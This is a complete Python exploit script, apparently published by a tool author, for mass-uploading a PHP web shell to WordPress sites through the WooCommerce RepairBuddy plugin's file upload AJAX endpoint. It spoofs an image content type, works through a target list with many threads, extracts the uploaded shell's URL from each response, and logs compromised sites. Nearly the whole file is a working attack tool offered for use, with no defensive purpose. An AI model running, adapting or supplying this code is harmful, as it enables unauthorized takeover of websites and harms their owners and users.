#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# By: Nxploited
# GitHub: https://github.com/Nxploited
# Telegram: https://t.me/KNxploited

import threading
import requests
import time
import os
import sys
import urllib3
import re

from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich.progress import (
    Progress,
    SpinnerColumn,
    BarColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich import box
from rich.theme import Theme

# =========================[ GLOBAL SETTINGS ]========================= #

CUSTOM_THEME = Theme(
    {
        "info": "bold cyan",
        "success": "bold white on green",
        "error": "bold red",
        "vuln": "bold yellow",
        "result": "bold white on green",
        "fail": "white on bright_black",
        "highlight": "bold magenta",
        "progress": "bold magenta",
        "dim": "bright_black",
        "header": "bold white on blue",
    }
)

console = Console(theme=CUSTOM_THEME)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
os.environ["NO_PROXY"] = "*"

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)

SUCCESS_FILE = "success_results.txt"
UPLOADED_SHELLS_FILE = "uploaded_shells.txt"


# =========================[ UI / BANNER ]============================= #

def print_banner():
    title = Text("RepairBuddy File Upload Exploit", style="header")
    author = Text("By: Nxploited", style="info")
    github = Text("GitHub: https://github.com/Nxploited", style="info")
    telegram = Text("Telegram: https://t.me/KNxploited", style="info")

    body = (
        f"{title}\n"
        f"{author}\n"
        f"{github}\n"
        f"{telegram}\n\n"
        "[highlight]Description:[/highlight] "
        "This script targets the WooCommerce RepairBuddy file upload AJAX endpoint:\n"
        "  [dim]/wp-admin/admin-ajax.php?action=wc_upload_file_ajax[/dim]\n\n"
        "[highlight]Usage Steps:[/highlight]\n"
        "  1. Prepare a [bold]targets list[/bold] file, each line a domain or URL (e.g. example.com).\n"
        "  2. Prepare your [bold]shell file[/bold] (e.g. shell.php) in the same directory.\n"
        "  3. Run the script and provide:\n"
        "     - Targets file name (e.g. list.txt)\n"
        "     - Shell filename (e.g. shell.php)\n"
        "     - Number of threads (e.g. 10)\n\n"
        "[highlight]Output:[/highlight]\n"
        "  - Successful targets are saved in: [bold green]success_results.txt[/bold green]\n"
        "  - Uploaded shell URLs are saved in: [bold green]uploaded_shells.txt[/bold green]\n"
    )

    console.print(Panel(body, box=box.DOUBLE, border_style="blue"))


# =========================[ UTILS ]=================================== #

def check_internet():
    while True:
        try:
            requests.head("https://www.google.com", timeout=4)
            return True
        except Exception:
            console.print("[error]Internet disconnected. Waiting to resume...[/error]")
            time.sleep(5)


def parse_inputs():
    list_file = console.input("[highlight]Enter targets file name (e.g., list.txt):[/] ").strip()
    shell_filename = console.input("[highlight]Enter your shell filename (e.g., shell.php):[/] ").strip()
    threads_raw = console.input("[highlight]Enter number of threads (default 10):[/] ").strip()

    if not threads_raw.isdigit() or int(threads_raw) < 1:
        threads = 10
    else:
        threads = int(threads_raw)

    return list_file, shell_filename, threads


def normalize_target(url: str) -> str:
    url = url.strip()
    if not url.lower().startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def read_targets(filename):
    if not os.path.exists(filename):
        console.print(f"[error]Targets file not found: {filename}[/error]")
        sys.exit(1)

    targets = []
    total = sum(1 for _ in open(filename, "r", encoding="utf-8", errors="ignore"))

    with open(filename, "r", encoding="utf-8", errors="ignore") as f, Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        transient=True,
        console=console,
    ) as progress:
        task = progress.add_task("[progress]Loading targets[/progress]", total=total)
        for line in f:
            url = line.strip()
            if url:
                targets.append(normalize_target(url))
            progress.update(task, advance=1)

    return targets


def write_line(filename, line):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(line.rstrip() + "\n")


# =========================[ OUTPUT HELPERS ]========================== #

def print_success_box(target_url, shell_path):
    panel_text = (
        "\n[success]SHELL UPLOADED SUCCESSFULLY![/success]\n"
        f"[highlight]Target:[/] [bold white]{target_url}[/]\n"
    )
    if shell_path:
        panel_text += f"[highlight]Shell Path:[/] [bold white]{shell_path}[/]\n"

    console.print(Panel(panel_text, box=box.DOUBLE, border_style="green"))


def print_fail_panel(target, reason):
    console.print(
        Panel(
            f"[bold white]{target}[/]\n[error]Exploit failed:[/] [dim]{reason}[/dim]",
            box=box.ROUNDED,
            border_style="bright_black",
            style="fail",
        )
    )


# =========================[ CORE EXPLOIT ]============================ #

def send_exploit(target_url, shell_filename):
    if not os.path.exists(shell_filename):
        return False, f"Shell file '{shell_filename}' not found!"

    upload_url = f"{target_url}/wp-admin/admin-ajax.php?action=wc_upload_file_ajax"

    try:
        with open(shell_filename, "rb") as shell_file:
            files = {
                "file": (shell_filename, shell_file, "image/png"),
            }
            resp = requests.post(
                upload_url,
                headers={"User-Agent": USER_AGENT},
                files=files,
                timeout=20,
                verify=False,
            )

        response_text = resp.text.replace("\\/", "/")

        success_indicators = [
            "repairbuddy_uploads",
            "/wp-content/repairbuddy_uploads/reciepts/",
        ]
        detected_success = any(ind in response_text for ind in success_indicators)

        shell_path = None
        pattern = (
            r'(https?://[^"]+/wp-content/repairbuddy_uploads/reciepts/[^"]*'
            + re.escape(shell_filename)
            + r'[^"]*)'
        )
        match = re.search(pattern, response_text)
        if match:
            shell_path = match.group(1)
        else:
            match2 = re.search(
                r'value="(https?://[^"]+/wp-content/repairbuddy_uploads/reciepts/[^"]*'
                + re.escape(shell_filename)
                + r'[^"]*)',
                response_text,
            )
            if match2:
                shell_path = match2.group(1)

        if detected_success or shell_path:
            return True, shell_path or "Indicator found"

        return False, response_text[:500]

    except Exception as e:
        return False, str(e)


def worker(thread_id, targets, shell_filename, progress_task=None, progress=None):
    for target in targets:
        check_internet()
        success, shell_path_or_resp = send_exploit(target, shell_filename)
        if success:
            print_success_box(target, shell_path_or_resp)
            write_line(SUCCESS_FILE, f"{target} | {shell_path_or_resp}")
            write_line(UPLOADED_SHELLS_FILE, shell_path_or_resp or "")
        else:
            print_fail_panel(target, shell_path_or_resp)

        if progress and progress_task is not None:
            progress.update(progress_task, advance=1)


def chunkify(lst, n):
    if n <= 0:
        n = 1
    return [lst[i::n] for i in range(n)]


def main():
    console.clear()
    print_banner()

    list_file, shell_filename, num_threads = parse_inputs()
    targets = read_targets(list_file)

    if not targets:
        console.print("[error]No targets loaded from file[/error]")
        sys.exit(1)

    console.print(
        Panel(
            f"[highlight]Targets:[/] [bold]{len(targets)}[/bold]\n"
            f"[highlight]Shell:[/] [bold]{shell_filename}[/bold]\n"
            f"[highlight]Threads:[/] [bold]{num_threads}[/bold]\n",
            box=box.ROUNDED,
            border_style="blue",
        )
    )

    target_chunks = chunkify(targets, num_threads)
    threads = []

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as progress:
        total_targets = len(targets)
        progress_task = progress.add_task(
            "[progress]Exploiting targets...[/progress]", total=total_targets
        )

        for i in range(num_threads):
            if i >= len(target_chunks):
                break
            th = threading.Thread(
                target=worker,
                args=(i, target_chunks[i], shell_filename, progress_task, progress),
            )
            th.daemon = True
            th.start()
            threads.append(th)

        for th in threads:
            th.join()

    console.print(
        Panel(
            "All targets processed.\n"
            f"Successes: [bold green]{SUCCESS_FILE}[/bold green]\n"
            f"Uploaded shells: [bold green]{UPLOADED_SHELLS_FILE}[/bold green]",
            box=box.DOUBLE,
            border_style="cyan",
            style="highlight",
        )
    )


if __name__ == "__main__":
    main()